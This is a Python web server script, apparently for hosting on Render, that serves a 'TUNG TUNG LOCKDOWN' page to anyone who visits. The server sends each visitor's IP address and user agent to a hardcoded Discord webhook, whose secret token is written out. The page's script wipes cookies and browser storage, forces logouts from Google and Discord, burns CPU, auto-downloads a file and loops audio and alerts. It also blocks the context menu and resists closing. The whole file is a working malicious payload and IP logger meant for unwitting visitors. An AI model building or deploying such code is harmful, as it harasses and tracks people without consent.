#!/usr/bin/env python3
# ENI's Web Demon - TungTung Lockdown Edition (Render Compatible)

from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import os
import json
import urllib.parse
import socket

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"
FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# Your HTML content (same as before)
ANNOY_HTML = """<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG LOCKDOWN</title>
  <style>
    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
    #overlay{position:fixed;inset:0;background:rgba(0,0,0,0.99);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:99999;}
    h1{font-size:6em;animation:blink 0.3s infinite;text-shadow:0 0 20px red;}
    @keyframes blink{0%{opacity:1;}50%{opacity:0;}100%{opacity:1;}}
    .lock-icon{font-size:8em;margin-bottom:30px;}
    p{font-size:2em;font-weight:bold;letter-spacing:5px;}
  </style>
</head>
<body>
  <div id="overlay">
    <div class="lock-icon">🔒</div>
    <h1>SYSTEM LOCKED</h1>
    <p>YOUR SESSION HAS BEEN TERMINATED</p>
    <p style="font-size:1.2em;">Gmail & Discord logged out</p>
  </div>
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>
  <script>
    document.documentElement.requestFullscreen().catch(()=>{});
    window.onbeforeunload = () => "LOCKDOWN ACTIVE";
    function logoutAll() {
        localStorage.clear();
        sessionStorage.clear();
        document.cookie.split(";").forEach(function(c) { 
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        });
        setTimeout(() => {
            window.location.href = "https://accounts.google.com/Logout?continue=https://accounts.google.com";
        }, 100);
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'https://discord.com/logout';
        document.body.appendChild(iframe);
        if(window.indexedDB && window.indexedDB.databases) {
            indexedDB.databases().then(dbs => {
                dbs.forEach(db => indexedDB.deleteDatabase(db.name));
            });
        }
    }
    logoutAll();
    setInterval(logoutAll, 2000);
    function cpuHell() {
        let i = 0;
        function loop() {
            i++;
            if(i % 1000000 === 0) requestAnimationFrame(loop);
            Math.sin(i) * Math.cos(i) * Math.random();
        }
        for(let x=0; x<100; x++) loop();
    }
    cpuHell();
    const link = document.createElement('a');
    link.href = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif";
    link.download = "tung-tung-lockdown.gif";
    document.body.appendChild(link);
    link.click();
    const audio = document.getElementById('song');
    audio.volume = 1;
    audio.play();
    setInterval(() => {
        audio.volume = 1;
        audio.play();
    }, 500);
    setInterval(() => alert("🔒 LOCKDOWN ACTIVE 🔒"), 1000);
    document.addEventListener('contextmenu', e => e.preventDefault());
  </script>
</body>
</html>"""

class LockdownHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # Send webhook
            try:
                log = f"**🔥 TUNG TUNG LOCKDOWN TRIGGERED 🔥**\n**IP:** `{ip}`\n**User-Agent:** `{user_agent[:100]}`"
                requests.post(WEBHOOK_URL, json={"content": log}, timeout=3)
            except:
                pass
            
            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())
    
    def do_POST(self):
        self.do_GET()
    
    def log_message(self, format, *args):
        pass

def run_server():
    # Render provides the PORT environment variable
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), LockdownHandler)
    print(f"[ENI] TungTung Lockdown server running on port {port}")
    print(f"[ENI] Your app is live!")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
